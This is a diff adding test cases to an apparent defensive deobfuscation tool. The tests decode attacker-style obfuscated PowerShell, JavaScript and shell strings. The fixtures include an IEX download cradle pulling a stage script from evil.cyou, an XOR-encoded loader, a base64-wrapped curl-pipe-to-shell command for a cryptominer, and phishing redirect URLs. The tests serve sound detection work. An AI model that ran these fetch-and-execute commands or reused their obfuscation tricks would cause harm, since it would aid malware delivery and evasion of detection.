@@ -417,3 +417,79 @@ test('Reverse: massive multi-kilobyte enterprise/threat-actor command (explicit 
   assert.equal(rLayered.output, massiveCmd);
 });
 
+/* ------------------------------------------------------------------ */
+/* Phase 2 SOC Stress & Wrapper Tests                                 */
+/* ------------------------------------------------------------------ */
+
+test('SIEM / Sysmon JSON log line containing -enc stops at JSON quote boundary', async () => {
+  const jsonLine = '{"EventID":1,"CommandLine":"powershell.exe -NoP -W Hidden -enc ' + utf16b64(CMD) + '","User":"CORP\\\\jdoe"}';
+  const r = await decode(jsonLine);
+  assert.equal(r.ok, true);
+  assert.equal(r.output, CMD);
+  assert.equal(r.warnings.length, 0);
+});
+
+test('PowerShell single-byte XOR (-bxor 35) Cobalt Strike style payload', async () => {
+  const xoredB64 = Buffer.from(CMD).map((b) => b ^ 35).toString('base64');
+  const script = `$b=[Convert]::FromBase64String('${xoredB64}');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor 35}`;
+  const r = await decode(script);
+  assert.equal(r.ok, true);
+  assert.equal(r.output, CMD);
+  assert.ok(r.steps.some((s) => /XOR/.test(s)));
+});
+
+test('PowerShell char-array, -f format operator, and inline [-1..-$s.Length] reversal', async () => {
+  const charArr = `([char[]]@(${Buffer.from('http://evil.com/drop.exe').join(',')}))-join''`;
+  const rChar = await decode(charArr);
+  assert.equal(rChar.ok, true);
+  assert.equal(rChar.output, 'http://evil.com/drop.exe');
+
+  const fmtCmd = `&("{1}{0}" -f 'EX','I') (New-Object Net.WebClient).DownloadString("htt"+"p://evil.cyou/stage.ps1")`;
+  const rFmt = await decode(fmtCmd);
+  assert.equal(rFmt.ok, true);
+  assert.ok(rFmt.output.includes('http://evil.cyou/stage.ps1'));
+
+  const revSlice = `$a='1sp.a/moc.live//:ptth'; -join $a[-1..-$a.Length]`;
+  const rRev = await decode(revSlice);
+  assert.equal(rRev.ok, true);
+  assert.ok(rRev.output.includes('http://evil.com/a.ps1'));
+});
+
+test('JavaScript atob(...), POSIX shell base64 -d pipe, PEM/Certutil armor, and JWT', async () => {
+  const rAtob = await decode(`eval(atob("${utf8b64("window.location='https://phish-login.vip/m365'")}"))`);
+  assert.equal(rAtob.ok, true);
+  assert.equal(rAtob.output, "window.location='https://phish-login.vip/m365'");
+  assert.equal(rAtob.warnings.length, 0);
+
+  const rBash = await decode(`echo "${utf8b64('curl -s http://185.220.101.55/xmrig.sh | sh')}" | base64 -d | bash`);
+  assert.equal(rBash.ok, true);
+  assert.equal(rBash.output, 'curl -s http://185.220.101.55/xmrig.sh | sh');
+  assert.equal(rBash.warnings.length, 0);
+
+  const rPem = await decode('-----BEGIN CERTIFICATE-----\n' + utf8b64('http://certutil-drop.com/payload.exe') + '\n-----END CERTIFICATE-----');
+  assert.equal(rPem.ok, true);
+  assert.equal(rPem.output, 'http://certutil-drop.com/payload.exe');
+
+  const jwt = `${utf8b64(JSON.stringify({ alg: 'RS256', typ: 'JWT' })).replace(/=+$/, '')}.${utf8b64(JSON.stringify({ sub: 'user@corp.com', ipaddr: '198.51.100.42' })).replace(/=+$/, '')}.sig123`;
+  const rJwt = await decode(jwt);
+  assert.equal(rJwt.ok, true);
+  assert.equal(rJwt.warnings.length, 0);
+  assert.ok(rJwt.output.includes('198.51.100.42'));
+});
+
+test('Multiple FromBase64String calls, Mimecast URL Protect, and Quoted-Printable URLs', async () => {
+  const multi = `$cfg=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${utf8b64('https://primary.com')}')); $stager=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${utf8b64('https://secondary.com/p.ps1')}'))`;
+  const rMulti = await decode(multi);
+  assert.equal(rMulti.ok, true);
+  assert.ok(rMulti.output.includes('https://primary.com'));
+  assert.ok(rMulti.output.includes('https://secondary.com/p.ps1'));
+
+  const rMime = await decode('https://protect-us.mimecast.com/s/AbCdEfGh?domain=evil-phish.com');
+  assert.equal(rMime.ok, true);
+  assert.ok(rMime.output.startsWith('https://evil-phish.com'));
+
+  const rQp = await decode('Click here: https://login=2Emicrosoft=2Eevil=2Ecom/verify?id=3D1234');
+  assert.equal(rQp.ok, true);
+  assert.ok(rQp.output.includes('https://login.microsoft.evil.com/verify?id=1234'));
+});
+
